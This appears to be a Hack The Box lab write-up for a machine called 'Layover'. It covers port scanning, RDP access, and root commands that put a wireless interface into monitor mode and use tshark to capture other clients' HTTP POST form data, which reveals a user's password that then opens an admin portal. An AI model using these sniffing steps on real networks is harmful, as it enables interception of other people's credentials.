# Layover---HTB

Nmap report
````
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 16:07 -0300
Nmap scan report for 10.129.3.213
Host is up (0.38s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   244.47 ms 10.10.16.1
2   449.34 ms 10.129.3.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
````

The only open ports are 22 and 3389, that correspond to ssh and rdp (remote desktop protocol).

The credentials given (contractor / Contractor2026!) only work at rpd:
````
xfreerdp /u:contractor /p:'Contractor2026!' /v:10.129.39.253
````
<img width="1030" height="795" alt="image" src="https://github.com/user-attachments/assets/ad08db8d-78f2-4d28-a144-2cf94dbe4d46" />

Rpd lags horribly. But we can access the browser:

<img width="1002" height="717" alt="image" src="https://github.com/user-attachments/assets/58aa1793-ed5f-4418-a3c3-1bfa8f1cb0ad" />

To connect to the portal you need to be connected to the airport wifi:

<img width="292" height="368" alt="image" src="https://github.com/user-attachments/assets/1f966f01-70c2-435c-b59b-541e24c39458" />

The airport portal does not have wnything important going on:

<img width="1001" height="676" alt="image" src="https://github.com/user-attachments/assets/98f6e10a-c2c8-4679-bd44-613fc1c4a99d" />

If we access CMD we are logged in as contractor:

<img width="822" height="512" alt="image" src="https://github.com/user-attachments/assets/bb4a084d-eb35-47b7-adeb-111415803907" />

We have two wireless network interfaces:

<img width="1012" height="311" alt="image" src="https://github.com/user-attachments/assets/7e936e74-ee2f-4733-9584-ad3c5c2144ff" />

Interestingly wirshark seems to be installed:

<img width="830" height="517" alt="image" src="https://github.com/user-attachments/assets/16aff650-9635-4bbc-a763-6ca0436dd57c" />

Let's try to use one to monitor the other:

````
sudo su
nmcli radio wifi on
nmcli dev set wlan2 managed yes
nmcli dev wifi connect "HTB International WiFi" ifname wlan2


ip addr show wlan2; ip route
getent hosts portal.international.htb wifi.international.htb


ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head

iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
````

The ouput are creds for the jenny user (jenny:Fl1ghtDeck2026!) we have login into the portal but this does notget us anythong very interesting:

<img width="1002" height="713" alt="image" src="https://github.com/user-attachments/assets/1c5f5977-117c-4326-8127-3ac3f56a0a0e" />

There is another login option at http://portal.international.htb/admin/login

<img width="1026" height="742" alt="image" src="https://github.com/user-attachments/assets/e64ebfea-ec0e-43d8-9c42-9965c4f818c5" />

Here we can login as jenny also:

<img width="1027" height="741" alt="image" src="https://github.com/user-attachments/assets/a91ac8fc-5364-4c43-a333-22dae23e3737" />

We found a targetable software Craft cms version solo 5.9.8



